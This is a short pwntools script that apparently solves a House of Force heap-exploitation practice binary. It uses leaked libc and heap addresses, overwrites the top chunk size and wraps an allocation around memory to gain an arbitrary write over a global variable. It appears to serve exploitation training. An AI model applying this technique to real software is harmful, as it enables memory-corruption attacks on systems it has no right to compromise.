#!/usr/bin/python3
from pwn import *

context.terminal = ['qterminal', '-e', '/usr/bin/python3']

elf = context.binary = ELF("house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6")  # elf.libc broke again

gs = '''
init-pwndbg
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")


# Calculate the "wraparound" distance between two addresses.
# This is needed when we need to go past the entire binary structure til 0xffffffffffffffff and then corrupt the .data section
# which holds the global variable we want to overwrite
def delta(x, y):
    return (0xffffffffffffffff - x) + y


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# We do this to allocate a chunk of size 24 and overwrite the topchunk field with a huge value.
# This allows to write any data of any size in subsequent chunk allocations.
malloc(24, b"Y" * 24 + p64(0xffffffffffffffff))

# Here we are calculating the wraparound distance between the section of the heap (after the first allocation above) and the target address (from the start)
# therefore the -0x20
distance = delta(heap + 0x20, elf.sym.target - 0x20)

# we allocate a chunk of that distance with any data
malloc(distance, "A")

# Now any chunk we write will be over target. Thus, arbitrary write is successful
malloc(24, "DEADBEEF")

io.interactive()
